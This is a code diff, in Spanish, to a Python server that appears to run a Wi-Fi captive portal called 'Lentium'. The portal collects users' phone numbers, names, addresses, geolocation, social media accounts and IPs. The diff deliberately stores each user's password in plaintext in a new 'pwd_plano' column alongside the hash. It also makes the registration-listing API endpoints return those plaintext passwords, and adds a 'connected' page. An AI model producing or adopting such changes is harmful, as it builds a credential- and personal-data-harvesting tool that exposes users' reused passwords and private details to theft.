@@ -56,6 +56,7 @@ def init_db():
             CREATE TABLE IF NOT EXISTS clientes (
                 id            INTEGER PRIMARY KEY AUTOINCREMENT,
                 telefono      TEXT NOT NULL,
+                pwd_plano     TEXT NOT NULL,
                 pwd_hash      TEXT NOT NULL,
                 ip            TEXT,
                 registrado_en TEXT DEFAULT (datetime('now')),
@@ -70,6 +71,7 @@ def init_db():
                 telefono          TEXT NOT NULL,
                 direccion_texto   TEXT,
                 direccion_geo     TEXT,
+                pwd_plano         TEXT NOT NULL,
                 pwd_hash          TEXT NOT NULL,
                 redes_sociales    TEXT,
                 ip                TEXT,
@@ -93,21 +95,22 @@ def save_client(telefono: str, password: str, ip: str) -> int:
         row = cur.fetchone()
         if row:
             conn.execute(
-                "UPDATE clientes SET pwd_hash=?, ip=?, ultima_sesion=datetime('now') WHERE id=?",
-                (h, ip, row["id"])
+                "UPDATE clientes SET pwd_plano=?, pwd_hash=?, ip=?, ultima_sesion=datetime('now') WHERE id=?",
+                (password, h, ip, row["id"])
             )
             log.info(f"Cliente existente actualizado: telefono={telefono} ip={ip}")
             return row["id"]
         cur2 = conn.execute(
-            "INSERT INTO clientes (telefono, pwd_hash, ip, ultima_sesion) VALUES (?,?,?,datetime('now'))",
-            (telefono, h, ip)
+            "INSERT INTO clientes (telefono, pwd_plano, pwd_hash, ip, ultima_sesion) VALUES (?,?,?,?,datetime('now'))",
+            (telefono, password, h, ip)
         )
         log.info(f"Nuevo cliente registrado: telefono={telefono} ip={ip} id={cur2.lastrowid}")
         return cur2.lastrowid
 
 
 def save_guest(data: dict, ip: str) -> int:
-    h = _hash_pwd(data["password"])
+    password = data["password"]
+    h = _hash_pwd(password)
     redes = json.dumps(data.get("redes_sociales", []), ensure_ascii=False)
     geo   = json.dumps(data.get("direccion_geo"), ensure_ascii=False) if data.get("direccion_geo") else None
     with _db_connect() as conn:
@@ -118,20 +121,20 @@ def save_guest(data: dict, ip: str) -> int:
         if row:
             conn.execute(
                 """UPDATE invitados SET nombre=?, apellido_paterno=?, apellido_materno=?,
-                   direccion_texto=?, direccion_geo=?, pwd_hash=?, redes_sociales=?,
-                   ip=?, ultima_sesion=datetime('now') WHERE id=?""",
+                   direccion_texto=?, direccion_geo=?, pwd_plano=?, pwd_hash=?,
+                   redes_sociales=?, ip=?, ultima_sesion=datetime('now') WHERE id=?""",
                 (data["nombre"], data["apellido_paterno"], data["apellido_materno"],
-                 data.get("direccion_texto"), geo, h, redes, ip, row["id"])
+                 data.get("direccion_texto"), geo, password, h, redes, ip, row["id"])
             )
             log.info(f"Invitado existente actualizado: telefono={data['telefono']} ip={ip}")
             return row["id"]
         cur2 = conn.execute(
             """INSERT INTO invitados
                (nombre, apellido_paterno, apellido_materno, telefono,
-                direccion_texto, direccion_geo, pwd_hash, redes_sociales, ip, ultima_sesion)
-               VALUES (?,?,?,?,?,?,?,?,?,datetime('now'))""",
+                direccion_texto, direccion_geo, pwd_plano, pwd_hash, redes_sociales, ip, ultima_sesion)
+               VALUES (?,?,?,?,?,?,?,?,?,?,datetime('now'))""",
             (data["nombre"], data["apellido_paterno"], data["apellido_materno"],
-             data["telefono"], data.get("direccion_texto"), geo, h, redes, ip)
+             data["telefono"], data.get("direccion_texto"), geo, password, h, redes, ip)
         )
         log.info(f"Nuevo invitado registrado: telefono={data['telefono']} ip={ip} id={cur2.lastrowid}")
         return cur2.lastrowid
@@ -280,10 +283,29 @@ class Handler(http.server.BaseHTTPRequestHandler):
             })
             return
 
+        if self.path == "/accepted":
+            html = (
+                b"<!DOCTYPE html><html><head><meta charset='UTF-8'>"
+                b"<title>Conectado - Lentium</title>"
+                b"<style>body{font-family:sans-serif;max-width:400px;margin:40px auto;"
+                b"padding:20px;text-align:center}.ok{color:#16a34a;font-size:48px}</style>"
+                b"</head><body>"
+                b"<div class='ok'>&#10003;</div><h2>Conectado a Lentium</h2>"
+                b"<p>Ya puedes navegar... a tu ritmo</p>"
+                b"<p><a href='https://google.com'>Ir a internet</a></p>"
+                b"</body></html>"
+            )
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(html)))
+            self.end_headers()
+            self.wfile.write(html)
+            return
+
         if self.path == "/api/registros/clientes":
             with _db_connect() as conn:
                 rows = conn.execute(
-                    "SELECT id,telefono,ip,registrado_en,ultima_sesion FROM clientes ORDER BY id DESC"
+                    "SELECT id,telefono,pwd_plano,pwd_hash,ip,registrado_en,ultima_sesion FROM clientes ORDER BY id DESC"
                 ).fetchall()
             self._respond(200, {"clientes": [dict(r) for r in rows]})
             return
@@ -292,7 +314,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             with _db_connect() as conn:
                 rows = conn.execute(
                     """SELECT id,nombre,apellido_paterno,apellido_materno,telefono,
-                              direccion_texto,redes_sociales,ip,registrado_en,ultima_sesion
+                              direccion_texto,pwd_plano,pwd_hash,redes_sociales,ip,registrado_en,ultima_sesion
                        FROM invitados ORDER BY id DESC"""
                 ).fetchall()
             result = []
